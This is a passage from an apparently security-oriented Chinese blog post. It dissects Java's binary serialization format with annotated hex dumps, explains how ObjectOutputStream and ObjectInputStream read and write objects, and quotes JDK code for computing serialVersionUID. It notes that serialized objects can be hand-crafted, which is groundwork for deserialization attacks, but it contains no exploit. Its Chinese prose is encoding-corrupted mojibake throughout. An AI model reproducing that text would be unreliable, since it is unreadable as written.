<p>å…¶ä¸­ï¼Œ<code>O:17:&quot;...&quot;</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ª <code>(Object)å¯¹è±¡</code>ï¼Œä»¥åŠè¯¥å¯¹è±¡ç±»åçš„å­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ï¼Œ<code>2:{...}</code> è¡¨ç¤ºè¯¥ç±»æœ‰2ä¸ªå­—æ®µ ï¼ˆå…ƒç´ é—´ç”¨ <code>;</code> åˆ†éš”ï¼Œé”®å€¼å¯¹ä¹Ÿåˆ†ä¸ºå‰åä¸¤ä¸ªå…ƒç´ è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ˜¯2ä¸ªå­—æ®µï¼Œåˆ™æ€»å…±ä¼šåŒ…å«4ä¸ªå…ƒç´ ï¼‰ï¼Œ<code>s:11:&quot;...&quot;</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º11çš„å­—ç¬¦ä¸²ï¼Œ<code>i:...</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ª <code>æ•´æ•°(integer)</code>ã€‚</p>
<p>ç”±æ­¤å¯çŸ¥ï¼ŒPHPåºåˆ—åŒ–å­—ç¬¦ä¸²åŸºæœ¬ä¸Šæ˜¯å¯äººè¯»çš„ï¼Œè€Œä¸”å¯¹äºç±»å¯¹è±¡æ¥è¯´ï¼Œå­—æ®µç­‰æˆå‘˜å±æ€§çš„åºåˆ—åŒ–é¡ºåºä¸å®šä¹‰é¡ºåºä¸€è‡´ã€‚æˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‰‹å·¥çš„æ–¹å¼æ¥æ„é€ ä»»æ„ä¸€ä¸ªPHPå¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p>
<hr>
<h3 id="Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²"><a href="#Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²" class="headerlink" title="Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²"></a>Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²</h3><p><font color="#0099ff">è€Œè¯¥å¯¹è±¡ç»è¿‡Javaåºåˆ—åŒ–åå¾—åˆ°çš„åˆ™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ä¸²ï¼š</font></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f d9 35 3c f7 d6 0a c6    ationDem o.5&lt;....</span><br><span class="line">d5 02 00 02 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 0b 73 74 72 69 6e 67  46 69 65 6c 64 74 00 12    ..string Fieldt..</span><br><span class="line">4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e    Ljava&#x2F;la ng&#x2F;Strin</span><br><span class="line">67 3b 78 70 00 01 7d f1  74 00 05 67 79 79 79 79    g;xp..&#125;. t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>ä»”ç»†è§‚å¯ŸäºŒè¿›åˆ¶ä¸²ä¸­çš„éƒ¨åˆ†å¯è¯»æ•°æ®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å·®ä¸å¤šåˆ†è¾¨å‡ºè¯¥å¯¹è±¡çš„ä¸€äº›åŸºæœ¬å†…å®¹ã€‚ä½†åŒæ ·ä¸ºäº†æ‰‹å†™çš„ç›®çš„ <em>ï¼ˆä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªç›®çš„ï¼ŸåŸå› å¾ˆç®€å•ï¼Œä¸ºäº†ä¸è¢«è¯­è¨€ç¯å¢ƒæŸç¼šï¼‰</em> ï¼Œä»¥åŠä¸ºæ¥ä¸‹æ¥çš„åºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æåšå‡†å¤‡ï¼Œæˆ‘ä»¬å…ˆä¾æ¬¡æ¥è§£è¯»ä¸€ä¸‹è¿™ä¸ªäºŒè¿›åˆ¶ä¸²ä¸­çš„å„ä¸ªå…ƒç´ ã€‚</p>
<ul>
<li><code>0xaced</code>ï¼Œé­”æœ¯å¤´</li>
<li><code>0x0005</code>ï¼Œç‰ˆæœ¬å· ï¼ˆJDKä¸»æµç‰ˆæœ¬ä¸€è‡´ï¼Œä¸‹æ–‡å¦‚æ— ç‰¹æ®Šæ ‡æ³¨ï¼Œéƒ½ä»¥<font color="red">JDK8u</font>ä¸ºä¾‹ï¼‰</li>
<li><code>0x73</code>ï¼Œå¯¹è±¡ç±»å‹æ ‡è¯† <em>ï¼ˆ<code>0x7n</code>åŸºæœ¬ä¸Šéƒ½å®šä¹‰äº†ç±»å‹æ ‡è¯†ç¬¦å¸¸é‡ï¼Œä½†ä¹Ÿè¦çœ‹å‡ºç°çš„ä½ç½®ï¼Œæ¯•ç«Ÿå®ƒä»¬éƒ½åœ¨å¯è§å­—ç¬¦çš„èŒƒå›´ï¼Œè¯¦è§<code>java.io.ObjectStreamConstants</code>ï¼‰</em></li>
<li><code>0x72</code>ï¼Œç±»æè¿°ç¬¦æ ‡è¯†</li>
<li><code>0x0011...</code>ï¼Œç±»åå­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ <em>ï¼ˆJavaåºåˆ—åŒ–ä¸­çš„UTF8æ ¼å¼æ ‡å‡†ï¼‰</em></li>
<li><code>0xd9353cf7d60ac6d5</code>ï¼Œåºåˆ—ç‰ˆæœ¬å”¯ä¸€æ ‡è¯† <em>ï¼ˆ<code>serialVersionUID</code>ï¼Œç®€ç§°SUIDï¼‰</em></li>
<li><code>0x02</code>ï¼Œå¯¹è±¡çš„åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½ï¼Œå¦‚æ˜¯å¦æ˜¯Block Dataæ¨¡å¼ã€è‡ªå®šä¹‰<code>writeObject()</code>ï¼Œ<code>Serializable</code>ã€<code>Externalizable</code>æˆ–<code>Enum</code>ç±»å‹ç­‰</li>
<li><code>0x0002</code>ï¼Œç±»çš„å­—æ®µä¸ªæ•°</li>
<li><code>0x49</code>ï¼Œæ•´æ•°ç±»å‹ç­¾åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ŒåŒç†ï¼Œä¹‹åçš„<code>0x4c</code>ä¸ºå­—ç¬¦ä¸²ç±»å‹ç­¾åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ <font color="#0099ff">ï¼ˆç±»å‹ç­¾åè¡¨ç¤ºä¸JVMè§„èŒƒä¸­çš„å®šä¹‰ç›¸åŒï¼‰</font></li>
<li><code>0x0008...</code>ï¼Œå­—æ®µåå­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ï¼ŒéåŸå§‹æ•°æ®ç±»å‹çš„å­—æ®µè¿˜ä¼šåœ¨åé¢åŠ ä¸Šæ•°æ®ç±»å‹æ ‡è¯†ã€å®Œæ•´ç±»å‹ç­¾åé•¿åº¦å’Œå€¼ï¼Œå¦‚ä¹‹åçš„<code>0x740012...</code></li>
<li><code>0x78</code> Block Dataç»“æŸæ ‡è¯†</li>
<li><code>0x70</code> çˆ¶ç±»æè¿°ç¬¦æ ‡è¯†ï¼Œæ­¤å¤„ä¸º<code>null</code></li>
<li><code>0x00017df1</code> æ•´æ•°å­—æ®µ<code>intField</code>çš„å€¼ <em>ï¼ˆJavaåºåˆ—åŒ–ä¸­çš„æ•´æ•°æ ¼å¼æ ‡å‡†ï¼‰</em> ï¼ŒéåŸå§‹æ•°æ®ç±»å‹çš„å­—æ®µåˆ™ä¼šæŒ‰å¯¹è±¡çš„æ–¹å¼å¤„ç†ï¼Œå¦‚ä¹‹åçš„å­—ç¬¦ä¸²å­—æ®µ<code>stringField</code>è¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œè¾“å‡ºå­—ç¬¦ä¸²ç±»å‹æ ‡è¯†ã€å­—ç¬¦ä¸²é•¿åº¦å’Œå€¼</li>
</ul>
<p>ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œé™¤äº†åŸºæœ¬æ ¼å¼å’Œä¸€äº›æ•´æ•°è¡¨ç°å½¢å¼ä¸Šçš„ä¸åŒä¹‹å¤–ï¼ŒJavaå’ŒPHPçš„åºåˆ—åŒ–ç»“æœè¿˜æ˜¯å­˜åœ¨å¾ˆå¤šç›¸ä¼¼çš„åœ°æ–¹ï¼Œæ¯”å¦‚é™¤äº†å…·ä½“å€¼å¤–éƒ½ä¼šå¯¹ç±»å‹è¿›è¡Œæè¿°ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJavaåºåˆ—åŒ–ä¸­å¯¹å­—æ®µè¿›è¡Œå°è£…æ—¶ï¼Œä¼šæŒ‰åŸå§‹å’ŒéåŸå§‹æ•°æ®ç±»å‹æ’åº <em>ï¼ˆæœ‰åŒå­¦å¯èƒ½æƒ³é—®ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œè¿™é‡Œæˆ‘åªèƒ½ç®€å•è§£é‡ŠåŸå› æœ‰ä¸¤ä¸ªï¼Œä¸€æ˜¯å› ä¸ºå®ƒä»¬ä¸¤ä¸ªçš„è¡¨ç°å½¢å¼ä¸åŒï¼ŒåŸå§‹æ•°æ®ç±»å‹å­—æ®µå¯ä»¥ç›´æ¥é€šè¿‡åç§»é‡è¯»å–å›ºå®šä¸ªæ•°çš„å­—èŠ‚æ¥èµ‹å€¼ï¼›äºŒæ˜¯åœ¨å°è£…æ—¶ä¼šè®¡ç®—åŸå§‹ç±»å‹å­—æ®µçš„åç§»é‡å’Œæ€»åç§»é‡ï¼Œä»¥åŠéåŸå§‹ç±»å‹å­—æ®µçš„ä¸ªæ•°ï¼Œè¿™ä½¿å¾—ååºåˆ—åŒ–é˜¶æ®µå¯ä»¥å¾ˆæ–¹ä¾¿çš„æŠŠåŸå§‹å’ŒéåŸå§‹æ•°æ®ç±»å‹åˆ†æˆä¸¤éƒ¨åˆ†æ¥å¤„ç†ï¼‰</em> ï¼Œä¸”å…¶ä¸­åˆä¼šæŒ‰å­—æ®µåæ’åºã€‚</p>
<p>è€Œå¼€å¤´å›ºå®šçš„<code>0xaced0005</code>ä¹Ÿå¯ä»¥ä½œä¸ºJavaåºåˆ—åŒ–äºŒè¿›åˆ¶ä¸² <em>ï¼ˆBase64ç¼–ç ä¸º<code>rO0AB...</code>ï¼‰</em> çš„è¯†åˆ«æ ‡è¯†ã€‚</p>
<hr>
<h3 id="è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š"><a href="#è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š" class="headerlink" title="è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š"></a>è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String superField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationComponentClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String componentField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">extends</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SerializationComponentClass component;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å®ƒåºåˆ—åŒ–åçš„äºŒè¿›åˆ¶ä¸²å¤§å®¶å¯ä»¥è‡ªè¡Œæ¶ˆåŒ–ç†è§£ä¸€ä¸‹ï¼Œæ³¨æ„å…¶ä¸­çš„åµŒå¥—å¯¹è±¡ï¼Œä»¥åŠ<code>0x71</code>è¡¨ç¤ºçš„<code>Reference</code>ç±»å‹æ ‡è¯† <em>ï¼ˆå½¢å¼ä¸Šä¸JVMçš„å¸¸é‡æ± ç±»ä¼¼ï¼Œç”¨äºéåŸå§‹æ•°æ®ç±»å‹çš„å¼•ç”¨å¯¹è±¡æ± ç´¢å¼•ï¼Œè¿™ä¸ªå¼•ç”¨å¯¹è±¡æ± åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–åˆ›å»ºæ—¶çš„å…ƒç´ å¡«å……é¡ºåºä¼šä¿æŒä¸€è‡´ï¼‰</em> ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f 1a 7f cd d3 53 6f 6b    ationDem o....Sok</span><br><span class="line">15 02 00 03 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 09 63 6f 6d 70 6f 6e  65 6e 74 74 00 1d 4c 53    ..compon entt..LS</span><br><span class="line">65 72 69 61 6c 69 7a 61  74 69 6f 6e 43 6f 6d 70    erializa tionComp</span><br><span class="line">6f 6e 65 6e 74 43 6c 61  73 73 3b 4c 00 0b 73 74    onentCla ss;L..st</span><br><span class="line">72 69 6e 67 46 69 65 6c  64 74 00 12 4c 6a 61 76    ringFiel dt..Ljav</span><br><span class="line">61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 72    a&#x2F;lang&#x2F;S tring;xr</span><br><span class="line">00 17 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 53    ..Serial izationS</span><br><span class="line">75 70 65 72 43 6c 61 73  73 de c6 50 b7 d1 2f a3    uperClas s..P..&#x2F;.</span><br><span class="line">27 02 00 01 4c 00 0a 73  75 70 65 72 46 69 65 6c    &#39;...L..s uperFiel</span><br><span class="line">64 71 00 7e 00 02 78 70  70 00 01 7d f1 73 72 00    dq.~..xp p..&#125;.sr.</span><br><span class="line">1b 53 65 72 69 61 6c 69  7a 61 74 69 6f 6e 43 6f    .Seriali zationCo</span><br><span class="line">6d 70 6f 6e 65 6e 74 43  6c 61 73 73 3c 76 ba b7    mponentC lass&lt;v..</span><br><span class="line">dd 9e 76 c4 02 00 01 4c  00 0e 63 6f 6d 70 6f 6e    ..v....L ..compon</span><br><span class="line">65 6e 74 46 69 65 6c 64  71 00 7e 00 02 78 70 70    entField q.~..xpp</span><br><span class="line">74 00 05 67 79 79 79 79                             t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•çš„åˆ†æä¸€ä¸‹åºåˆ—åŒ–çš„æ‰§è¡Œæµç¨‹ï¼š</p>
<ol>
<li><code>ObjectOutputStream</code>å®ä¾‹åˆå§‹åŒ–æ—¶ï¼Œå°†é­”æœ¯å¤´å’Œç‰ˆæœ¬å·å†™å…¥<code>bout</code> <em>ï¼ˆ<code>BlockDataOutputStream</code>ç±»å‹ï¼‰</em> ä¸­</li>
<li>è°ƒç”¨<code>ObjectOutputStream.writeObject()</code>å¼€å§‹å†™å¯¹è±¡æ•°æ®<ul>
<li><code>ObjectStreamClass.lookup()</code>å°è£…å¾…åºåˆ—åŒ–çš„ç±»æè¿° <em>ï¼ˆè¿”å›<code>ObjectStreamClass</code>ç±»å‹ï¼‰</em> ï¼Œè·å–åŒ…æ‹¬ç±»åã€è‡ªå®šä¹‰<code>serialVersionUID</code>ã€å¯åºåˆ—åŒ–å­—æ®µ <em>ï¼ˆè¿”å›<code>ObjectStreamField</code>ç±»å‹ï¼‰</em> å’Œæ„é€ æ–¹æ³•ï¼Œä»¥åŠ<code>writeObject</code>ã€<code>readObject</code>æ–¹æ³•ç­‰</li>
<li><code>writeOrdinaryObject()</code>å†™å…¥å¯¹è±¡æ•°æ®<ul>
<li>å†™å…¥å¯¹è±¡ç±»å‹æ ‡è¯†</li>
<li><code>writeClassDesc()</code>è¿›å…¥åˆ†æ”¯<code>writeNonProxyDesc()</code>å†™å…¥ç±»æè¿°æ•°æ®<ul>
<li>å†™å…¥ç±»æè¿°ç¬¦æ ‡è¯†</li>
<li>å†™å…¥ç±»å</li>
<li>å†™å…¥SUID <em>ï¼ˆå½“SUIDä¸ºç©ºæ—¶ï¼Œä¼šè¿›è¡Œè®¡ç®—å¹¶èµ‹å€¼ï¼Œç»†èŠ‚è§ä¸‹é¢å…³äºSerialVersionUIDç« èŠ‚ï¼‰</em></li>
<li>è®¡ç®—å¹¶å†™å…¥åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½</li>
<li>å†™å…¥å­—æ®µä¿¡æ¯æ•°æ®</li>
<li>å†™å…¥Block Dataç»“æŸæ ‡è¯†</li>
<li>å†™å…¥çˆ¶ç±»æè¿°æ•°æ®</li>
</ul>
</li>
<li><code>writeSerialData()</code>å†™å…¥å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®<ul>
<li>è‹¥ç±»è‡ªå®šä¹‰äº†<code>writeObject()</code>ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•å†™å¯¹è±¡ï¼Œå¦åˆ™è°ƒç”¨<code>defaultWriteFields()</code>å†™å…¥å¯¹è±¡çš„å­—æ®µæ•°æ® <em>ï¼ˆè‹¥æ˜¯éåŸå§‹ç±»å‹ï¼Œåˆ™é€’å½’å¤„ç†å­å¯¹è±¡ï¼‰</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h3 id="ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š"><a href="#ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š" class="headerlink" title="ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š"></a>ç»§ç»­ç”¨ç®€å•çš„ç¤ºä¾‹æ¥çœ‹çœ‹ååºåˆ—åŒ–ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data; <span class="comment">// read from file or request</span></span><br><span class="line">    ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">    ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bin);</span><br><span class="line">    SerializationDemo demo = (SerializationDemo) in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å®ƒçš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><code>ObjectInputStream</code>å®ä¾‹åˆå§‹åŒ–æ—¶ï¼Œè¯»å–é­”æœ¯å¤´å’Œç‰ˆæœ¬å·è¿›è¡Œæ ¡éªŒ</li>
<li>è°ƒç”¨<code>ObjectInputStream.readObject()</code>å¼€å§‹è¯»å¯¹è±¡æ•°æ®<ul>
<li>è¯»å–å¯¹è±¡ç±»å‹æ ‡è¯†</li>
<li><code>readOrdinaryObject()</code>è¯»å–æ•°æ®å¯¹è±¡<ul>
<li><code>readClassDesc()</code>è¯»å–ç±»æè¿°æ•°æ®<ul>
<li>è¯»å–ç±»æè¿°ç¬¦æ ‡è¯†ï¼Œè¿›å…¥åˆ†æ”¯<code>readNonProxyDesc()</code></li>
<li>è¯»å–ç±»å</li>
<li>è¯»å–SUID</li>
<li>è¯»å–å¹¶åˆ†è§£åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½</li>
<li>è¯»å–å­—æ®µä¿¡æ¯æ•°æ®</li>
<li><code>resolveClass()</code>æ ¹æ®ç±»åè·å–å¾…ååºåˆ—åŒ–çš„ç±»çš„<code>Class</code>å¯¹è±¡ï¼Œå¦‚æœè·å–å¤±è´¥ï¼Œåˆ™æŠ›å‡º<code>ClassNotFoundException</code></li>
<li><code>skipCustomData()</code>å¾ªç¯è¯»å–å­—èŠ‚ç›´åˆ°Block Dataç»“æŸæ ‡è¯†ä¸ºæ­¢</li>
<li>è¯»å–çˆ¶ç±»æè¿°æ•°æ®</li>
<li><code>initNonProxy()</code>ä¸­åˆ¤æ–­å¯¹è±¡ä¸æœ¬åœ°å¯¹è±¡çš„SUIDå’Œç±»å <em>ï¼ˆä¸å«åŒ…åï¼‰</em> æ˜¯å¦ç›¸åŒï¼Œè‹¥ä¸åŒï¼Œåˆ™æŠ›å‡º<code>InvalidClassException</code></li>
</ul>
</li>
<li><code>ObjectStreamClass.newInstance()</code>è·å–å¹¶è°ƒç”¨ç¦»å¯¹è±¡æœ€è¿‘çš„é<code>Serializable</code>çš„çˆ¶ç±»çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆè‹¥ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›<code>null</code>ï¼‰</em> åˆ›å»ºå¯¹è±¡å®ä¾‹</li>
<li><code>readSerialData()</code>è¯»å–å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®<ul>
<li>è‹¥ç±»è‡ªå®šä¹‰äº†<code>readObject()</code>ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•è¯»å¯¹è±¡ï¼Œå¦åˆ™è°ƒç”¨<code>defaultReadFields()</code>è¯»å–å¹¶å¡«å……å¯¹è±¡çš„å­—æ®µæ•°æ®</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="å…³äºSerialVersionUID"><a href="#å…³äºSerialVersionUID" class="headerlink" title="å…³äºSerialVersionUID"></a>å…³äºSerialVersionUID</h3><p>åœ¨Javaçš„åºåˆ—åŒ–æœºåˆ¶ä¸­ï¼ŒSUIDå æ®ç€å¾ˆé‡è¦çš„ä½ç½®ï¼Œå®ƒç›¸å½“äºä¸€ä¸ª<code>å¯¹è±¡çš„æŒ‡çº¹ä¿¡æ¯</code>ï¼Œå¯ä»¥ç›´æ¥å†³å®šååºåˆ—åŒ–çš„æˆåŠŸä¸å¦ï¼Œé€šè¿‡ä¸Šé¢å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æµç¨‹çš„åˆ†æä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œè‹¥SUIDä¸ä¸€è‡´ï¼Œæ˜¯æ— æ³•ååºåˆ—åŒ–æˆåŠŸçš„ã€‚</p>
<p>ä½†æ˜¯ï¼ŒSUIDåˆ°åº•æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Œå®ƒçš„æŒ‡çº¹ä¿¡æ¯ç»´åº¦åŒ…æ‹¬å¯¹è±¡çš„å“ªäº›å†…å®¹ï¼Œå¯èƒ½è¿˜æ˜¯æœ‰å¾ˆå¤šåŒå­¦ä¸å¤ªæ¸…æ¥šã€‚è¿™é‡Œæˆ‘ä»¬å¯¹ç…§ <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/class.html#a4100" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a> çš„è¯´æ˜ï¼Œç»“åˆJDKçš„æºä»£ç æ¥ä¸ºå¤§å®¶ç®€å•çš„æ¢³ç†ä¸€ä¸‹ã€‚</p>
<p>é¦–å…ˆ<code>ObjectStreamClass.getSerialVersionUID()</code>åœ¨è·å–SUIDæ—¶ï¼Œä¼šåˆ¤æ–­SUIDæ˜¯å¦å·²ç»å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨æ‰è°ƒç”¨<code>computeDefaultSUID()</code>è®¡ç®—é»˜è®¤çš„SUIDï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…ˆé¡ºå¸¦æä¸€å˜´ï¼Œ<code>AccessController.doPrivileged()</code>ä¼šå¿½ç•¥JREé…ç½®çš„å®‰å…¨ç­–ç•¥çš„æ£€æŸ¥ï¼Œä»¥ç‰¹æƒçš„èº«ä»½å»æ‰§è¡Œ<code>PrivilegedAction</code>æ¥å£ä¸­çš„<code>run()</code>ï¼Œå¯ä»¥é˜²æ­¢JDKåº•å±‚åœ¨è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶å¯èƒ½å‡ºç°çš„ä¸€äº›æƒé™é—®é¢˜ã€‚è¿™äº›å†…å®¹ä¸æœ¬æ–‡ä¸»é¢˜æ— å…³ï¼Œä¸å¤šä½œè¯¦ç»†è§£é‡Šï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹çœ‹Javaçš„SecurityåŒ…å’Œå…¶ä¸­çš„java.policyã€java.securityæ–‡ä»¶å†…å®¹ã€‚</p>
<p>é‡ç‚¹æ¥äº†ï¼Œè®¡ç®—SUIDæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ª<code>DataOutputStream</code>å¯¹è±¡ï¼Œæ‰€æœ‰äºŒè¿›åˆ¶æ•°æ®å†™å…¥å…¶åŒ…è£…çš„<code>ByteArrayOutputStream</code>ä¸­ï¼š</p>
<ol>
<li>å†™å…¥ç±»å <em>ï¼ˆUTF8ï¼‰</em> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dout.writeUTF(cl.getName());</span><br></pre></td></tr></table></figure></div></li>
<li>å†™å…¥ç±»è®¿é—®æƒé™æ ‡è¯† <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">    (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">        Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">Method[] methods = cl.getDeclaredMethods();</span><br><span class="line"><span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">    classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">        (classMods | Modifier.ABSTRACT) :</span><br><span class="line">        (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">&#125;</span><br><span class="line">dout.writeInt(classMods);</span><br></pre></td></tr></table></figure></div></li>
<li>å¦‚æœä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œå†™å…¥å®ç°æ¥å£çš„æ¥å£åï¼ŒæŒ‰æ¥å£åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">    Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">    String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(ifaceNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">        dout.writeUTF(ifaceNames[i]);</span><br><span 